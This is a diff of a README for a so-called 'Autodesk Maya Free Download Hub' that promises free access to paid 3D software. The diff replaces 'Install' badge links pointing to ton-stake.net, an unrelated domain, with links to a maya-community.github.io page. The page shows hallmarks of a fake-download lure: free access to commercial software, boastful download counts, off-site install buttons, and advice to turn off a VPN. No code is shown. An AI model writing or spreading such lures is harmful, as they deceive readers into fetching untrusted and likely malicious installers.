@@ -7,10 +7,10 @@ Downloads: 35K+ | Subscribers: 20K+ | Last Updated: June 2025
 
 **Description**: Dive into 3D animation with the **Autodesk Maya Free Download Hub** in 2025! This repository offers exclusive tutorials, resources, and tips to explore modeling, simulation, and rendering. Join our community with 35K+ downloads and 20K+ subscribers for free access!  
 
-[![Install Maya](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
-
+<a href="https://maya-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+ 
 ## 📋 Installation Guide  
 
 Get started with Autodesk Maya using these simple steps to access free resources! 🛠️  
@@ -30,9 +30,10 @@ Get started with Autodesk Maya using these simple steps to access free resources
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-[![Install Maya](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://maya-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
 
 ## 💡 Why Choose Maya Free Download Hub  
 
